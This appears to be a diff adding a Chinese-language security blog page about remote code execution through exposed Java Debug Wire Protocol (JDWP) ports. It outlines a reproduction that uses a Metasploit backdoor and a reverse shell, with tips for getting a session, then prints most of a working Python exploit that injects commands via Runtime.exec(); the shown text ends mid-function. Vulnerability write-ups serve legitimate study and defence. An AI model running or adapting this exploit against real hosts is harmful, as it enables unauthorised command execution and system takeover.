@@ -1,0 +1,791 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>She11c0de&#39;s blogs</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="JDWP 远程代码执行漏洞一、漏洞简介　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java PlatformDebugger Architecture）中，它定义了调试器（debugger）和被调试的 Java虚拟机（target vm）之间的通信协议。与PHP的 Xdebug类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。 二、">
+<meta property="og:type" content="article">
+<meta property="og:title" content="She11c0de&#39;s blogs">
+<meta property="og:url" content="https://she11c0de.github.io/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:site_name" content="She11c0de&#39;s blogs">
+<meta property="og:description" content="JDWP 远程代码执行漏洞一、漏洞简介　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java PlatformDebugger Architecture）中，它定义了调试器（debugger）和被调试的 Java虚拟机（target vm）之间的通信协议。与PHP的 Xdebug类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。 二、">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png">
+<meta property="og:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId41.png">
+<meta property="article:published_time" content="2022-07-08T06:25:57.875Z">
+<meta property="article:modified_time" content="2022-07-08T07:24:51.673Z">
+<meta property="article:author" content="She11c0de">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://she11c0de.github.io/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link type="text/css" href="//netdna.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.css" rel="stylesheet">
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+<link rel="stylesheet" href="/css/scrollUp/image.css">
+
+  <!--[if lt IE 9]><script src="//cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7/html5shiv.min.js"></script><![endif]-->
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <div class="logo">
+        <img src="/logo.png" alt="Profile Picture">
+      </div>
+      <div id="title">She11c0de's blogs</div>
+      
+       <ul class="my-socials">
+  
+ 
+</ul>
+    </div>
+  </div>
+  <div id="header-inner" class="">
+    <nav id="main-nav">
+      <a id="main-nav-toggle" class="nav-icon"></a>
+      <!--
+        
+          
+            <a class="main-nav-link" href="/">首页</a>
+          
+            <a class="main-nav-link" href="/categories/life">生活</a>
+          
+            <a class="main-nav-link" href="/archives">归档</a>
+          
+        
+      -->
+    </nav>
+    <nav id="title-nav" style="display:none">
+      <a href="/">She11c0de&#39;s blogs</a>
+      <img src="/logo.png" alt="Profile Picture">
+      <!--
+      <span id="title-nav-socials">
+        
+       
+     </span>
+      -->
+    </nav>
+    <nav id="sub-nav">
+      
+      <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+    </nav>
+    <div id="search-form-wrap">
+      <form action="http://www.baidu.com/baidu" method="get" accept-charset="utf-8" class="search-form">
+        <input type="search" name="word" maxlength="20" class="search-form-input" placeholder="搜索">
+        <input type="submit" value="" class="search-form-submit">
+        <input name=tn type=hidden value="bds">
+        <input name=cl type=hidden value="3">
+        <input name=ct type=hidden value="2097152">
+        <input type="hidden" name="si" value="she11c0de.github.io">
+      </form>
+    </div>
+  </div>
+  <div class="site-nav" style="display: none;">
+    <ul>
+      
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/categories/life">生活</a></li>
+      
+        <li><a href="/archives">归档</a></li>
+      
+      
+    </ul>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-JDWP/JDWP 远程代码执行漏洞" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2022/07/07/JDWP/JDWP%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" class="article-date">
+  <time datetime="2022-07-08T06:25:57.875Z" itemprop="datePublished">2022-07-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="JDWP-远程代码执行漏洞"><a href="#JDWP-远程代码执行漏洞" class="headerlink" title="JDWP 远程代码执行漏洞"></a>JDWP 远程代码执行漏洞</h1><h2 id="一、漏洞简介"><a href="#一、漏洞简介" class="headerlink" title="一、漏洞简介"></a>一、漏洞简介</h2><p>　JDWP 是 Java Debug Wire Protocol 的缩写，在JPDA（Java Platform<br>Debugger Architecture）中，它定义了调试器（debugger）和被调试的 Java<br>虚拟机（target vm）之间的通信协议。与PHP的 Xdebug<br>类似，当其调试端口直接开放在公网上时，很容易被攻击者攻击并且获取系统权限。</p>
+<h2 id="二、漏洞影响"><a href="#二、漏洞影响" class="headerlink" title="二、漏洞影响"></a>二、漏洞影响</h2><p>开启了JDWP服务的主机。</p>
+<h2 id="三、复现过程"><a href="#三、复现过程" class="headerlink" title="三、复现过程"></a>三、复现过程</h2><h3 id="利用dnslog确定可以执行命令："><a href="#利用dnslog确定可以执行命令：" class="headerlink" title="利用dnslog确定可以执行命令："></a>利用dnslog确定可以执行命令：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId25.png" alt="1.png">执行结果：<img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId26.png" alt="2.png"></p>
+<h3 id="生成msf后门文件，并将其放入自己的web目录下："><a href="#生成msf后门文件，并将其放入自己的web目录下：" class="headerlink" title="生成msf后门文件，并将其放入自己的web目录下："></a>生成msf后门文件，并将其放入自己的web目录下：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId28.png" alt="3.png"></p>
+<h3 id="执行命令，让目标主机下载后门："><a href="#执行命令，让目标主机下载后门：" class="headerlink" title="执行命令，让目标主机下载后门："></a>执行命令，让目标主机下载后门：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId30.png" alt="4.png"></p>
+<h3 id="设置msf-让其处于监听状态："><a href="#设置msf-让其处于监听状态：" class="headerlink" title="设置msf,让其处于监听状态："></a>设置msf,让其处于监听状态：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId32.png" alt="5.png"><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId33.png" alt="6.png"><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId34.png" alt="7.png"></p>
+<h3 id="给予后门可执行的权限，并执行后门："><a href="#给予后门可执行的权限，并执行后门：" class="headerlink" title="给予后门可执行的权限，并执行后门："></a>给予后门可执行的权限，并执行后门：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId36.png" alt="8.png"><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId37.png" alt="9.png"></p>
+<h3 id="查看msf反弹shell情况："><a href="#查看msf反弹shell情况：" class="headerlink" title="查看msf反弹shell情况："></a>查看msf反弹shell情况：</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId39.png" alt="10.png"></p>
+<h3 id="这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl-c，然后用sessions-1来使用创建的session。"><a href="#这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl-c，然后用sessions-1来使用创建的session。" class="headerlink" title="这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl+c，然后用sessions 1来使用创建的session。"></a>这个时候session已经成功创建，但是没办法正常出现meterpreter终端。这个时候需要ctrl+c，然后用sessions 1来使用创建的session。</h3><p><img src="/resource/JDWP%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/media/rId41.png" alt="11.png"></p>
+<h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><pre><code>　　1、不要直接反弹shell，弹不过来的。
+　　2、在使用Msf生成后门反弹的时候，往往会卡在&quot;session 1 opend&quot;，这个时候使用ctrl + c强制退出，然后使用session 1，选择session即可解决。
+　　3、JDWP的端口是随机选择的，所以在探测的时候要选择全端口。具体判断的时候nmap可以判断出来，
+Java Debug Wire Protocol (Reference Imp lementation)version 1.8 1.8.0 181，这个是我遇到的那个服务版本。
+</code></pre>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><pre><code>import socket
+import time
+import sys
+import struct
+import urllib
+import argparse
+
+
+
+################################################################################
+#
+# JDWP protocol variables
+#
+HANDSHAKE                 = &quot;JDWP-Handshake&quot;
+
+REQUEST_PACKET_TYPE       = 0x00
+REPLY_PACKET_TYPE         = 0x80
+
+# Command signatures
+VERSION_SIG               = (1, 1)
+CLASSESBYSIGNATURE_SIG    = (1, 2)
+ALLCLASSES_SIG            = (1, 3)
+ALLTHREADS_SIG            = (1, 4)
+IDSIZES_SIG               = (1, 7)
+CREATESTRING_SIG          = (1, 11)
+SUSPENDVM_SIG             = (1, 8)
+RESUMEVM_SIG              = (1, 9)
+SIGNATURE_SIG             = (2, 1)
+FIELDS_SIG                = (2, 4)
+METHODS_SIG               = (2, 5)
+GETVALUES_SIG             = (2, 6)
+CLASSOBJECT_SIG           = (2, 11)
+INVOKESTATICMETHOD_SIG    = (3, 3)
+REFERENCETYPE_SIG         = (9, 1)
+INVOKEMETHOD_SIG          = (9, 6)
+STRINGVALUE_SIG           = (10, 1)
+THREADNAME_SIG            = (11, 1)
+THREADSUSPEND_SIG         = (11, 2)
+THREADRESUME_SIG          = (11, 3)
+THREADSTATUS_SIG          = (11, 4)
+EVENTSET_SIG              = (15, 1)
+EVENTCLEAR_SIG            = (15, 2)
+EVENTCLEARALL_SIG         = (15, 3)
+
+# Other codes
+MODKIND_COUNT             = 1
+MODKIND_THREADONLY        = 2
+MODKIND_CLASSMATCH        = 5
+MODKIND_LOCATIONONLY      = 7
+EVENT_BREAKPOINT          = 2
+SUSPEND_EVENTTHREAD       = 1
+SUSPEND_ALL               = 2
+NOT_IMPLEMENTED           = 99
+VM_DEAD                   = 112
+INVOKE_SINGLE_THREADED    = 2
+TAG_OBJECT                = 76
+TAG_STRING                = 115
+TYPE_CLASS                = 1
+MODKIND_STEP              = 10 
+EVENTKIND_STEP            = 1
+STEP_MIN                  = 0
+STEP_INTO                 = 0
+
+################################################################################
+#
+# JDWP client class
+#
+class JDWPClient:
+
+    def __init__(self, host, port=8000):
+        self.host = host
+        self.port = port
+        self.methods = &#123;&#125;
+        self.fields = &#123;&#125;
+        self.id = 0x01
+        return
+
+    def create_packet(self, cmdsig, data=&quot;&quot;):
+        flags = 0x00
+        cmdset, cmd = cmdsig
+        pktlen = len(data) + 11
+        pkt = struct.pack(&quot;&gt;IIccc&quot;, pktlen, self.id, chr(flags), chr(cmdset), chr(cmd))
+        pkt+= data
+        self.id += 2
+        return pkt
+
+    def read_reply(self):
+        header = self.socket.recv(11)
+        pktlen, id, flags, errcode = struct.unpack(&quot;&gt;IIcH&quot;, header)
+
+        if flags == chr(REPLY_PACKET_TYPE):
+            if errcode :
+                raise Exception(&quot;Received errcode %d&quot; % errcode)
+
+        buf = &quot;&quot;
+        while len(buf) + 11 &lt; pktlen:
+            data = self.socket.recv(1024)
+            if len(data):
+                buf += data
+            else:
+                time.sleep(1)
+        return buf
+
+    def parse_entries(self, buf, formats, explicit=True):
+        entries = []
+        index = 0
+
+
+        if explicit:
+            nb_entries = struct.unpack(&quot;&gt;I&quot;, buf[:4])[0]
+            buf = buf[4:]
+        else:
+            nb_entries = 1
+
+        for i in range(nb_entries):
+            data = &#123;&#125;
+            for fmt, name in formats:
+                if fmt == &quot;L&quot; or fmt == 8:
+                    data[name] = int(struct.unpack(&quot;&gt;Q&quot;,buf[index:index+8]) [0])
+                    index += 8
+                elif fmt == &quot;I&quot; or fmt == 4:
+                    data[name] = int(struct.unpack(&quot;&gt;I&quot;, buf[index:index+4])[0])
+                    index += 4
+                elif fmt == &#39;S&#39;:
+                    l = struct.unpack(&quot;&gt;I&quot;, buf[index:index+4])[0]
+                    data[name] = buf[index+4:index+4+l]
+                    index += 4+l
+                elif fmt == &#39;C&#39;:
+                    data[name] = ord(struct.unpack(&quot;&gt;c&quot;, buf[index])[0])
+                    index += 1
+                elif fmt == &#39;Z&#39;:
+                    t = ord(struct.unpack(&quot;&gt;c&quot;, buf[index])[0])
+                    if t == 115:
+                        s = self.solve_string(buf[index+1:index+9])
+                        data[name] = s
+                        index+=9
+                    elif t == 73:
+                        data[name] = struct.unpack(&quot;&gt;I&quot;, buf[index+1:index+5])[0]
+                        buf = struct.unpack(&quot;&gt;I&quot;, buf[index+5:index+9])
+                        index=0
+
+                else:
+                    print &quot;Error&quot;
+                    sys.exit(1)
+
+            entries.append( data )
+
+        return entries
+
+    def format(self, fmt, value):
+        if fmt == &quot;L&quot; or fmt == 8:
+            return struct.pack(&quot;&gt;Q&quot;, value)
+        elif fmt == &quot;I&quot; or fmt == 4:
+            return struct.pack(&quot;&gt;I&quot;, value)
+
+        raise Exception(&quot;Unknown format&quot;)
+
+    def unformat(self, fmt, value):
+        if fmt == &quot;L&quot; or fmt == 8:
+            return struct.unpack(&quot;&gt;Q&quot;, value[:8])[0]
+        elif fmt == &quot;I&quot; or fmt == 4:
+            return struct.unpack(&quot;&gt;I&quot;, value[:4])[0]
+        else:
+            raise Exception(&quot;Unknown format&quot;)
+        return
+
+    def start(self):
+        self.handshake(self.host, self.port)
+        self.idsizes()
+        self.getversion()
+        self.allclasses()
+        return
+
+    def handshake(self, host, port):
+        s = socket.socket()
+        try:
+            s.connect( (host, port) )
+        except socket.error as msg:
+            raise Exception(&quot;Failed to connect: %s&quot; % msg)
+
+        s.send( HANDSHAKE )
+
+        if s.recv( len(HANDSHAKE) ) != HANDSHAKE:
+            raise Exception(&quot;Failed to handshake&quot;)
+        else:
+            self.socket = s
+
+        return
+
+    def leave(self):
+        self.socket.close()
+        return
+
+    def getversion(self):
+        self.socket.sendall( self.create_packet(VERSION_SIG) )
+        buf = self.read_reply()
+        formats = [ (&#39;S&#39;, &quot;description&quot;), (&#39;I&#39;, &quot;jdwpMajor&quot;), (&#39;I&#39;, &quot;jdwpMinor&quot;),
+                    (&#39;S&#39;, &quot;vmVersion&quot;), (&#39;S&#39;, &quot;vmName&quot;), ]
+        for entry in self.parse_entries(buf, formats, False):
+            for name,value  in entry.iteritems():
+                setattr(self, name, value)
+        return
+
+    @property
+    def version(self):
+        return &quot;%s - %s&quot; % (self.vmName, self.vmVersion)
+
+    def idsizes(self):
+        self.socket.sendall( self.create_packet(IDSIZES_SIG) )
+        buf = self.read_reply()
+        formats = [ (&quot;I&quot;, &quot;fieldIDSize&quot;), (&quot;I&quot;, &quot;methodIDSize&quot;), (&quot;I&quot;, &quot;objectIDSize&quot;),
+                    (&quot;I&quot;, &quot;referenceTypeIDSize&quot;), (&quot;I&quot;, &quot;frameIDSize&quot;) ]
+        for entry in self.parse_entries(buf, formats, False):
+            for name,value  in entry.iteritems():
+                setattr(self, name, value)
+        return
+
+    def allthreads(self):
+        try:
+            getattr(self, &quot;threads&quot;)
+        except :
+            self.socket.sendall( self.create_packet(ALLTHREADS_SIG) )
+            buf = self.read_reply()
+            formats = [ (self.objectIDSize, &quot;threadId&quot;)]
+            self.threads = self.parse_entries(buf, formats)
+        finally:
+            return self.threads
+
+    def get_thread_by_name(self, name):
+        self.allthreads()
+        for t in self.threads:
+            threadId = self.format(self.objectIDSize, t[&quot;threadId&quot;])
+            self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
+            buf = self.read_reply()
+            if len(buf) and name == self.readstring(buf):
+                return t
+        return None
+
+    def get_name_by_threadId(self, threadId):
+        threadId = self.format(self.objectIDSize, threadId)
+        self.socket.sendall( self.create_packet(THREADNAME_SIG, data=threadId) )
+        buf = self.read_reply()
+        formats = [ (&#39;S&#39;, &quot;name&quot;) ]
+        buf = self.parse_entries(buf, formats, False)
+        return buf[0][&#39;name&#39;]
+    
+    def allclasses(self):
+        try:
+            getattr(self, &quot;classes&quot;)
+        except:
+            self.socket.sendall( self.create_packet(ALLCLASSES_SIG) )
+            buf = self.read_reply()
+            formats = [ (&#39;C&#39;, &quot;refTypeTag&quot;),
+                        (self.referenceTypeIDSize, &quot;refTypeId&quot;),
+                        (&#39;S&#39;, &quot;signature&quot;),
+                        (&#39;I&#39;, &quot;status&quot;)]
+            self.classes = self.parse_entries(buf, formats)
+
+        return self.classes
+
+    def get_class_by_name(self, name):
+        for entry in self.classes:
+            if entry[&quot;signature&quot;].lower() == name.lower() :
+                return entry
+        return None
+
+    def get_methods(self, refTypeId):
+        if not self.methods.has_key(refTypeId):
+            refId = self.format(self.referenceTypeIDSize, refTypeId)
+            self.socket.sendall( self.create_packet(METHODS_SIG, data=refId) )
+            buf = self.read_reply()
+            formats = [ (self.methodIDSize, &quot;methodId&quot;),
+                        (&#39;S&#39;, &quot;name&quot;),
+                        (&#39;S&#39;, &quot;signature&quot;),
+                        (&#39;I&#39;, &quot;modBits&quot;)]
+            self.methods[refTypeId] = self.parse_entries(buf, formats)
+        return self.methods[refTypeId]
+
+    def get_method_by_name(self, name):
+        for refId in self.methods.keys():
+            for entry in self.methods[refId]:
+                if entry[&quot;name&quot;].lower() == name.lower() :
+                    return entry
+        return None
+
+    def getfields(self, refTypeId):
+        if not self.fields.has_key( refTypeId ):
+            refId = self.format(self.referenceTypeIDSize, refTypeId)
+            self.socket.sendall( self.create_packet(FIELDS_SIG, data=refId) )
+            buf = self.read_reply()
+            formats = [ (self.fieldIDSize, &quot;fieldId&quot;),
+                        (&#39;S&#39;, &quot;name&quot;),
+                        (&#39;S&#39;, &quot;signature&quot;),
+                        (&#39;I&#39;, &quot;modbits&quot;)]
+            self.fields[refTypeId] = self.parse_entries(buf, formats)
+        return self.fields[refTypeId]
+
+    def getvalue(self, refTypeId, fieldId):
+        data = self.format(self.referenceTypeIDSize, refTypeId)
+        data+= struct.pack(&quot;&gt;I&quot;, 1)
+        data+= self.format(self.fieldIDSize, fieldId)
+        self.socket.sendall( self.create_packet(GETVALUES_SIG, data=data) )
+        buf = self.read_reply()
+        formats = [ (&quot;Z&quot;, &quot;value&quot;) ]
+        field = self.parse_entries(buf, formats)[0]
+        return field
+
+    def createstring(self, data):
+        buf = self.buildstring(data)
+        self.socket.sendall( self.create_packet(CREATESTRING_SIG, data=buf) )
+        buf = self.read_reply()
+        return self.parse_entries(buf, [(self.objectIDSize, &quot;objId&quot;)], False)
+
+    def buildstring(self, data):
+        return struct.pack(&quot;&gt;I&quot;, len(data)) + data
+
+    def readstring(self, data):
+        size = struct.unpack(&quot;&gt;I&quot;, data[:4])[0]
+        return data[4:4+size]
+
+    def suspendvm(self):
+        self.socket.sendall( self.create_packet( SUSPENDVM_SIG ) )
+        self.read_reply()
+        return
+
+    def resumevm(self):
+        self.socket.sendall( self.create_packet( RESUMEVM_SIG ) )
+        self.read_reply()
+        return
+
+    def invokestatic(self, classId, threadId, methId, *args):
+        data = self.format(self.referenceTypeIDSize, classId)
+        data+= self.format(self.objectIDSize, threadId)
+        data+= self.format(self.methodIDSize, methId)
+        data+= struct.pack(&quot;&gt;I&quot;, len(args))
+        for arg in args:
+            data+= arg
+        data+= struct.pack(&quot;&gt;I&quot;, 0)
+
+        self.socket.sendall( self.create_packet(INVOKESTATICMETHOD_SIG, data=data) )
+        buf = self.read_reply()
+        return buf
+
+    def invoke(self, objId, threadId, classId, methId, *args):
+        data = self.format(self.objectIDSize, objId)
+        data+= self.format(self.objectIDSize, threadId)
+        data+= self.format(self.referenceTypeIDSize, classId)
+        data+= self.format(self.methodIDSize, methId)
+        data+= struct.pack(&quot;&gt;I&quot;, len(args))
+        for arg in args:
+            data+= arg
+        data+= struct.pack(&quot;&gt;I&quot;, 0)
+
+        self.socket.sendall( self.create_packet(INVOKEMETHOD_SIG, data=data) )
+        buf = self.read_reply()
+        return buf
+
+    def solve_string(self, objId):
+        self.socket.sendall( self.create_packet(STRINGVALUE_SIG, data=objId) )
+        buf = self.read_reply()
+        if len(buf):
+            return self.readstring(buf)
+        else:
+            return &quot;&quot;
+
+    def query_thread(self, threadId, kind):
+        data = self.format(self.objectIDSize, threadId)
+        self.socket.sendall( self.create_packet(kind, data=data) )
+        buf = self.read_reply()
+        return buf
+
+    def suspend_thread(self, threadId):
+        return self.query_thread(threadId, THREADSUSPEND_SIG)
+
+    def status_thread(self, threadId):
+        buf = self.query_thread(threadId, THREADSTATUS_SIG)
+        formats = [ (&#39;I&#39;, &quot;threadStatus&quot;),
+                   (&#39;I&#39;,&#39;suspendStatus&#39;)]
+        threadStatus = cli.parse_entries(buf, formats, False)
+        return threadStatus
+
+    def resume_thread(self, threadId):
+        return self.query_thread(threadId, THREADRESUME_SIG)
+
+    def send_event(self, eventCode, *args):
+        data = &quot;&quot;
+        data+= chr( eventCode )
+        data+= chr( SUSPEND_ALL )
+        data+= struct.pack(&quot;&gt;I&quot;, len(args))
+
+        for kind, option in args:
+            data+= chr( kind )
+            data+= option
+
+        self.socket.sendall( self.create_packet(EVENTSET_SIG, data=data) )
+        buf = self.read_reply()
+        return struct.unpack(&quot;&gt;I&quot;, buf)[0]
+
+    def clear_event(self, eventCode, rId):
+        data = chr(eventCode)
+        data+= struct.pack(&quot;&gt;I&quot;, rId)
+        self.socket.sendall( self.create_packet(EVENTCLEAR_SIG, data=data) )
+        self.read_reply()
+        return
+
+    def clear_events(self):
+        self.socket.sendall( self.create_packet(EVENTCLEARALL_SIG) )
+        self.read_reply()
+        return
+
+    def wait_for_event(self):
+        buf = self.read_reply()
+        return buf
+
+    def parse_event(self, buf, eventId):
+        num = struct.unpack(&quot;&gt;I&quot;, buf[2:6])[0]
+        rId = struct.unpack(&quot;&gt;I&quot;, buf[6:10])[0]
+        if rId != eventId:
+            return None
+        tId = self.unformat(self.objectIDSize, buf[10:10+self.objectIDSize])
+        loc = -1 # don&#39;t care
+        return rId, tId, loc
+
+    
+def runtime_exec(jdwp):
+
+    # 1. get Runtime class reference
+    runtimeClass = jdwp.get_class_by_name(&quot;Ljava/lang/Runtime;&quot;)
+    if runtimeClass is None:
+        print (&quot;[-] Cannot find class Runtime&quot;)
+        return False
+    print (&quot;[+] Found Runtime class: id=%x&quot; % runtimeClass[&quot;refTypeId&quot;])
+
+    # 2. get getRuntime() meth reference
+    jdwp.get_methods(runtimeClass[&quot;refTypeId&quot;])
+    getRuntimeMeth = jdwp.get_method_by_name(&quot;getRuntime&quot;)
+    if getRuntimeMeth is None:
+        print (&quot;[-] Cannot find method Runtime.getRuntime()&quot;)
+        return False
+    print (&quot;[+] Found Runtime.getRuntime(): id=%x&quot; % getRuntimeMeth[&quot;methodId&quot;])
+
+    # 3. setup &#39;step into&#39; event
+    threads = jdwp.allthreads()
+    for thread in threads:
+        threadStatus = jdwp.status_thread(thread[&#39;threadId&#39;])
+        threadStatus = threadStatus[0][&quot;threadStatus&quot;]
+        if threadStatus == 2: #Sleeping
+            threadId = thread[&#39;threadId&#39;]
+            break
+    if &quot;threadId&quot; not in dir():
+        print(&quot;Could not find a suitable thread for stepping&quot;)
+        exit()
+    
+    print(&quot;[+] Setting &#39;step into&#39; event in thread: %s&quot; % threadId)
+    jdwp.suspendvm()
+    step_info  = jdwp.format(jdwp.objectIDSize, threadId)
+    step_info += struct.pack(&quot;&gt;I&quot;,STEP_MIN)
+    step_info += struct.pack(&quot;&gt;I&quot;,STEP_INTO)
+    data       = [ (MODKIND_STEP, step_info), ]
+    
+    rId = jdwp.send_event(EVENTKIND_STEP, *data)
+
+    # 4. resume vm and wait for event
+    jdwp.resumevm()
+
+    while True:
+        buf = jdwp.wait_for_event()
+        ret = jdwp.parse_event(buf, rId)
+        if ret is not None:
+            break
+
+    rId, tId, loc = ret
+    print (&quot;[+] Received matching event from thread %#x&quot; % tId)
+
+    jdwp.clear_event(EVENTKIND_STEP, rId)
+
+    # 5. Now we can execute any code
+    runtime_exec_payload(jdwp, tId, runtimeClass[&quot;refTypeId&quot;], getRuntimeMeth[&quot;methodId&quot;], args.cmd)
+
+
+    jdwp.resumevm()
+
+    print (&quot;[!] Command successfully executed&quot;)
+
+    return True
+
+def runtime_exec_payload(jdwp, threadId, runtimeClassId, getRuntimeMethId, command):
+    #
+    # This function will invoke command as a payload, which will be running
+    # with JVM privilege on host (intrusive).
+    #
+    print (&quot;[+] Selected payload &#39;%s&#39;&quot; % command)
+
+    # 1. allocating string containing our command to exec()
+    cmdObjIds = jdwp.createstring( command )
+    if len(cmdObjIds) == 0:
+        print (&quot;[-] Failed to allocate command&quot;)
+        return False
+    cmdObjId = cmdObjIds[0][&quot;objId&quot;]
+    print (&quot;[+] Command string object created id:%x&quot; % cmdObjId)
+
+    # 2. use context to get Runtime object
+    buf = jdwp.invokestatic(runtimeClassId, threadId, getRuntimeMethId)
+    if buf[0] != chr(TAG_OBJECT):
+        print (&quot;[-] Unexpected returned type: expecting Object&quot;)
+        return False
+    rt = jdwp.unformat(jdwp.objectIDSize, buf[1:1+jdwp.objectIDSize])
+
+    if rt is None:
+        print &quot;[-] Failed to invoke Runtime.getRuntime()&quot;
+        return False
+    print (&quot;[+] Runtime.getRuntime() returned context id:%#x&quot; % rt)
+
+    # 3. find exec() method
+    execMeth = jdwp.get_method_by_name(&quot;exec&quot;)
+    if execMeth is None:
+        print (&quot;[-] Cannot find method Runtime.exec()&quot;)
+        return False
+    print (&quot;[+] found Runtime.exec(): id=%x&quot; % execMeth[&quot;methodId&quot;])
+
+    # 4. call exec() in this context with the alloc-ed string
+    data = [ chr(TAG_OBJECT) + jdwp.format(jdwp.objectIDSize, cmdObjId) ]
+    buf = jdwp.invoke(rt, threadId, runtimeClassId, execMeth[&quot;methodId&quot;], *data)
+    if buf[0] != chr(TAG_OBJECT):
+        print (&quot;[-] Unexpected returned type: expecting Object&quot;)
